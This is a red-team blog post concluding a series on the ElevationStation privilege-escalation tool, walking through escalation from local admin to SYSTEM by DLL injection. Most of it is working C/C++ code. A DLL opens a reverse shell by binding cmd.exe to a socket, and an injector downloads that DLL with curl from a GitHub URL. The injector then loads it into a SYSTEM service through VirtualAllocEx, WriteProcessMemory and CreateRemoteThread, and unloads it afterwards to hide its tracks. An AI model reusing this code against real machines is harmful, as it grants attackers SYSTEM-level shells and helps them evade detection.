---
title:  "ElevationStation - A walk through the development process [Finale/Wrapping things up]"
header:
  teaser: "/assets/images/teaser4.png"
categories:
  - privilege escalation
tags:
  - escalation
  - dll injection
  - malware
  - red team
  - win32api
  - privesc
  - privilege escalation
  - elevationstation
  - getsystem
  - metasploit
---

Hello again cyber amigos!  It's time to draw our talk of ElevationStation to a close, well...at least this portion of Elevation Station.  Stay tuned in the near future for discussions surrounding how C2 models are designed and using elevationstation with a C2 framework for easy escalation!

Let's talk about privilege escalation using DLL Injection: 
-
The general approach to DLL injection, as it pertains to escalating from local admin to SYSTEM, is to inject a DLL into a system level process.

We begin by coding our dll and include a function that gets called on the DLL ATTACH portion of our code.  This function handles our reverse shell which of course will call back home to our attacker box:

```c++

// For x64 compile with: x86_64-w64-mingw32-gcc -o mig2.dll -shared mig2.c -lws2_32
// For x86 compile with: i686-w64-mingw32-gcc -o mig2.dll -shared mig2.c -lws2_32
void socketfunc(void);

#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
void socketfunc(void)
{
	//FreeConsole();
	const char* REMOTE_ADDR = "127.0.0.1";
	unsigned short REMOTE_PORT = 4445;
	WSADATA wsaData;
	SOCKET wSock;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct sockaddr_in sockinfo;
	//memset(&sockinfo, 0, sizeof(sockinfo))
	// create socket
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	sockinfo.sin_family = AF_INET;
	sockinfo.sin_port = htons(REMOTE_PORT);
	sockinfo.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	// connect to remote host
	WSAConnect(wSock, (SOCKADDR*)&sockinfo, sizeof(sockinfo), NULL, NULL, NULL, NULL);

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES;
	//si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)wSock;
	si.hStdOutput = (HANDLE)wSock;
	si.hStdError = (HANDLE)wSock;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	//WaitForSingleObject(pi.hProcess, INFINITE);
	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);
	//WSACleanup();
}



BOOL APIENTRY DllMain (HANDLE hdll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
    case DLL_PROCESS_ATTACH:
        socketfunc();


    }
    return TRUE;
}
```

Now, let's proceed!  We have our compiled DLL that we will use to initiate our reverse shell.  We can now visit the **D11Inj3ct0r** function in our ElevationStation code to see how we carry out the injection:

```c++

bool D11Inj3ct0r(DWORD pid)
{
    HMODULE hMods[1024];
    //HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

    cout << "[+] Downloading your dll from the elevationstation repo for the rev sh311 now!\n";
    WinExec("curl -# -L -o \"c:\\users\\public\\mig2.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/d11inj3ction_files/mig2.dll\"", 0);
    Sleep(3000);
    //enable ALL necessary privs!!!
    setProcessPrivs(SE_DEBUG_NAME);
    setProcessPrivs(SE_IMPERSONATE_NAME);
    //priv enable routine complete
    //BOOL bRet;
    
        HANDLE processHandle;
        PVOID remoteBuffer;
     
        wchar_t dllPath[] = TEXT("C:\\Users\\public\\mig2.dll");

        printf("[+] Opening process handle for PID: %i\n", pid);
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!processHandle)
        {
            printf("[!] Need more priveleges to access...Error Code: %d\n", GetLastError());
            exit(0);
        }
```
Part 1 - Setting things up:
-
 - We start by downloading the dll file from the elevationstation repo.  You could change this to a another location if you like.  I just made this as simple a process as I could 🐶
 - Next, we enable all our necessary privs.  I left SE_IMPERSONATE_NAME in there for good measure but it probably isn't needed. I can't remember...
 - After privs are enabled, we open a handle to the Process we want to use for injecting our DLL.  I'm going to use the AppleMobileDevice service for the purposes of this walkthrough

Part 2 - Checking Architecture
-
- Now, we need to ensure the process is the same architecture as our DLL **AND** our elevationstation binary

```c++
 BOOL bIsWow64 = FALSE;
        if (!IsWow64Process(processHandle, &bIsWow64)) //execute the API
        {
            printf("There was an issue executing the api against this PID...Error Code: %i\n", GetLastError());
            exit(0);
        }

        //printf("%s", bIsWow64 ? "true" : "false");

        if (!bIsWow64)
        {
            printf("[+] PID %d is 64-bit!\n", pid);

        }
        else
        {
            printf("[!] PID %d is 64-bit and won't work with this program...\n", pid);
            exit(0);

        }
```
Part 3 - Allocate & Write Memory, and Create our remote thread!
-
- Now, we need to use our open handle to the remote process and allocate/write our dll into memory and then create the remote thread to execute it at the location we setup in memory within the process!

```c++
printf("[+] Allocating memory in remote process...\n");
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
        if (!remoteBuffer)
        {
            printf("[!] Couldn't allocate memory: %d\n", GetLastError());
            exit(0);
        }
        printf("[+] Writing memory to remote process...\n");
        if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL))
        {
            printf("[!] couldn't write memory...Error Code: %d\n", GetLastError());
            exit(0);
        }
        printf("[+] Creating remote thread...\n");
        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL))
        {
            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
            exit(0);
        }
        printf("[+] Remote Process Injection completed successfully!!!\n");
        printf("[+] Now, time to unload the injected dll to hide our tracks...\n");
        Sleep(5000);
```
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/29a18a5a-9109-42a8-a594-c9a96af986f8)
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/2fc6e10f-d181-4c96-8328-f2c409de1b29)


Wrap it all up!
-
While we're all incredibly excited about the newly popped SYSTEM shell via DLL injection, we still need to clean up our mess.  

After the DLL creates the reverse shell, it's no longer needed and can be safely unloaded.  Here's how we can accomplish that and also screenshots in ProcessHacker/System Informer demonstrating the DLL being loaded and unloaded

```c++
 //close module handle to dll
        if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
        {
            for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
            {
                TCHAR szModName[MAX_PATH];

                // Get the full path to the module's file.

                if (GetModuleFileNameEx(processHandle, hMods[i], szModName,
                    sizeof(szModName) / sizeof(TCHAR)))
                {
                    // Print the module name and handle value.
                    if (_tcscmp(szModName, L"C:\\Users\\public\\mig2.dll") == 0)
                    {
                        printf("[+] found the dll within the injected process!\n");
                        _tprintf(L"\t%s (0x%08X)\n", szModName, hMods[i]);

                        
                        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "FreeLibrary");
                        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, hMods[i], 0, NULL))
                        {
                            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
                            exit(0);
                        }
                        else
                        {
                            std::cout << "[+] CreateRemoteThread success and injected dll unloaded!  Enjoy your shell ;)\n";
                            exit(0);
                        }

                    }
                }
            }
        }
```

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/e3393bef-8253-4e6e-b837-c901d5407f0d)

and the unloading of the dll

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/ba354fd8-344c-48c5-b2db-1d9f59fe72fe)

That's it for today, and our final writeup for Elevation Station as far as the code goes.  I will include more information about Elevation Station in the near future, but will be focusing more on it's usage in pentest scenarios and not as much emphasis on the underlying code behind it.

see ya!
